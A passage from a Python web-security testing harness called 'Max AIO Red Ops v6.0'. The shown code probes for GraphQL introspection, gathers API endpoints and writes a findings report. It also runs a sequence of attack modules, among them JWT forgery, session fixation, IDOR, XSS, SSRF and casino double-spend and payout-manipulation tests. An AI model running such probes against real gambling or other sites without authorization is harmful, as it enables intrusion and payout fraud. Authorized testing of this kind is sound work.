                        self.report["websocket_findings"].append({"severity": "HIGH", "detail": f"Unauthenticated WebSocket handshake accepted: {ws_url}"})
                except Exception:
                    pass

            for path in ("/graphql", "/api/graphql", "/v1/graphql"):
                try:
                    r = requests.post(urljoin(TARGET_URL, path), json={"query": "{ __schema { types { name } } }"}, timeout=6)
                    if r.status_code == 200 and "__schema" in r.text:
                        self.report["graphql_findings"].append({"severity": "MEDIUM", "detail": f"GraphQL introspection enabled at {path}"})
                        break
                except Exception:
                    continue

            endpoints = set()
            for req in self.intercepted_requests:
                parsed = urlparse(req["url"])
                if "/api/" in parsed.path or parsed.path.startswith("/v") or "graphql" in parsed.path:
                    endpoints.add(f"{req['method']} {parsed.path}")
            self.report["api_endpoints"] = sorted(list(endpoints))
            await browser.close()

    def generate_report(self):
        end_time = datetime.utcnow().isoformat() + "Z"
        self.report["completed_at"] = end_time
        sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        categories = [
            "jwt_analysis", "dom_xss", "storage_exposure", "route_bypass", "idor_bola",
            "nuclei_findings", "websocket_findings", "graphql_findings", "cors_findings",
            "prototype_pollution", "postmessage_issues", "race_conditions",
            "security_headers", "open_redirects", "js_secrets", "rate_limiting",
            # v5
            "casino_race", "casino_payout_integrity", "casino_amount_validation",
            "reflected_xss_candidates", "ssrf_param_candidates", "http_method_tampering",
            # v6
            "casino_bonus_rollover", "casino_freespin_scatter", "casino_provably_fair",
            "auth_jwt_forgery", "auth_session_fixation", "auth_cookie_flags", "auth_oauth_redirect",
        ]
        all_findings = []
        for cat in categories:
            all_findings.extend(self.report.get(cat, []))
        for f in all_findings:
            sev = f.get("severity", "INFO").upper() if isinstance(f, dict) else "INFO"
            sev_counts[sev] = sev_counts.get(sev, 0) + 1
        self.report["summary"] = {
            "total_findings": len(all_findings),
            "severity_breakdown": sev_counts,
            "api_endpoints_observed": len(self.report["api_endpoints"]),
            "subdomains_found": len(self.report["subdomains"]),
            "errors": len(self.report["errors"]),
            "run_stateful": RUN_STATEFUL,
            "version": "6.0",
        }

        def section(title, items):
            if not items:
                return f"<h2>{title}</h2><p>No findings.</p>"
            rows = ""
            for item in items:
                if isinstance(item, dict):
                    sev = item.get("severity", "INFO").upper()
                    detail = item.get("detail") or item.get("evidence") or item.get("name") or str(item)
                    matched = item.get("matched_at") or item.get("url") or ""
                    fix = item.get("fix", "")
                    rows += f'<div class="finding {sev.lower()}"><strong>{sev}</strong> — {detail}'
                    if matched:
                        rows += f'<br><code>{matched}</code>'
                    if fix:
                        rows += f'<br><em>Fix:</em> {fix}'
                    rows += '</div>'
                else:
                    rows += f'<div class="finding">{item}</div>'
            return f"<h2>{title}</h2>{rows}"

        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Max AIO v6.0</title>
<style>
body{{font-family:system-ui;background:#0d1117;color:#c9d1d9;padding:40px;max-width:1100px;margin:auto}}
h1,h2{{color:#58a6ff}}
.finding{{padding:12px;margin-bottom:8px;border-left:4px solid #30363d;background:#161b22;border-radius:4px}}
.critical{{border-left-color:#f85149}}
.high{{border-left-color:#d29922}}
.medium{{border-left-color:#e3b341}}
.low{{border-left-color:#8b949e}}
.info{{border-left-color:#58a6ff}}
code{{color:#79c0ff}}
em{{color:#8b949e}}
.badge{{display:inline-block;padding:2px 8px;border-radius:4px;background:#21262d;margin-right:6px}}
</style></head><body>
<h1>Max AIO Red Ops Report v6.0</h1>
<p>Target: {TARGET_URL}<br>
<span class="badge">RUN_STATEFUL={RUN_STATEFUL}</span>
<span class="badge">version=6.0</span>
Total: {self.report['summary']['total_findings']} |
CRITICAL {sev_counts['CRITICAL']} | HIGH {sev_counts['HIGH']} | MEDIUM {sev_counts['MEDIUM']} |
LOW {sev_counts['LOW']} | INFO {sev_counts['INFO']}<br>
Subdomains: {len(self.report['subdomains'])}</p>
{section("JWT Structure", self.report["jwt_analysis"])}
{section("Auth JWT Forgery Attempts", self.report["auth_jwt_forgery"])}
{section("Auth Session Fixation", self.report["auth_session_fixation"])}
{section("Auth Cookie Flags", self.report["auth_cookie_flags"])}
{section("Auth OAuth / redirect_uri", self.report["auth_oauth_redirect"])}
{section("Verified BOLA / IDOR", self.report["idor_bola"])}
{section("Casino Race / Double-Spend", self.report["casino_race"])}
{section("Casino Payout / Odds Integrity", self.report["casino_payout_integrity"])}
{section("Casino Amount Validation", self.report["casino_amount_validation"])}
{section("Casino Bonus / Rollover", self.report["casino_bonus_rollover"])}
{section("Casino Free-Spin / Scatter", self.report["casino_freespin_scatter"])}
{section("Casino Provably-Fair Seeds", self.report["casino_provably_fair"])}
{section("Security Headers", self.report["security_headers"])}
{section("Open Redirects", self.report["open_redirects"])}
{section("JS Secrets", self.report["js_secrets"])}
{section("Reflected XSS Candidates", self.report["reflected_xss_candidates"])}
{section("SSRF Parameter Candidates", self.report["ssrf_param_candidates"])}
{section("HTTP Method Tampering", self.report["http_method_tampering"])}
{section("Rate Limiting", self.report["rate_limiting"])}
{section("Route Bypass", self.report["route_bypass"])}
{section("DOM XSS", self.report["dom_xss"])}
{section("Token Storage", self.report["storage_exposure"])}
{section("Nuclei", self.report["nuclei_findings"])}
{section("WebSocket", self.report["websocket_findings"])}
{section("GraphQL", self.report["graphql_findings"])}
{section("CORS", self.report["cors_findings"])}
{section("Prototype Pollution", self.report["prototype_pollution"])}
{section("postMessage", self.report["postmessage_issues"])}
{section("Race Conditions (generic)", self.report["race_conditions"])}
<h2>Subdomains</h2><ul>{''.join(f'<li><code>{s}</code></li>' for s in self.report['subdomains']) or '<li>None</li>'}</ul>
<h2>API Endpoints</h2><ul>{''.join(f'<li><code>{e}</code></li>' for e in self.report['api_endpoints']) or '<li>None</li>'}</ul>
<h2>Errors</h2><ul>{''.join(f'<li>{e}</li>' for e in self.report['errors']) or '<li>None</li>'}</ul>
</body></html>"""
        with open("max_aio_v6_report.html", "w") as f:
            f.write(html)
        with open("max_aio_v6_report.json", "w") as f:
            json.dump(self.report, f, indent=2)
        print("[+] Reports: max_aio_v6_report.html / max_aio_v6_report.json")

    async def execute(self):
        self.preflight_check()
        print(f"INITIATING MAX AIO RED OPS v6.0: {TARGET_URL}")
        print(f"  AUTHORIZED={AUTHORIZED} | RUN_STATEFUL={RUN_STATEFUL}\n")
        self.audit_security_headers()
        self.run_subfinder()
        self.check_rate_limiting()
        self.test_http_method_tampering()
        self.test_auth_cookie_flags()
        self.test_auth_session_fixation()
        await self.run_spa_playwright()
        # Casino modules (read-only by default; stateful gated)
        self.scan_casino_payout_integrity()
        self.scan_casino_bonus_rollover()
        self.scan_casino_freespin_scatter()
        self.scan_casino_provably_fair()
        self.test_casino_race()
        self.test_casino_amount_validation()
        # Auth forgery (STATEFUL) + oauth redirect
        self.test_auth_jwt_forgery()
        self.test_auth_oauth_redirect()
        # Standard web vectors (candidates)
        self.test_reflected_xss_candidates()
        self.test_ssrf_param_candidates()
        self.test_bola()
        self.test_open_redirect()
        self.run_nuclei()
        self.run_zap()
        self.generate_report()
        s = self.report["summary"]
        print(f"\nCOMPLETE. Findings: {s['total_findings']} | "
              f"CRITICAL: {s['severity_breakdown']['CRITICAL']} | "
              f"HIGH: {s['severity_breakdown']['HIGH']} | "
              f"MEDIUM: {s['severity_breakdown']['MEDIUM']} | "
              f"Subdomains: {s['subdomains_found']}")


if __name__ == "__main__":
    asyncio.run(MaxRedOpsHarness().execute())
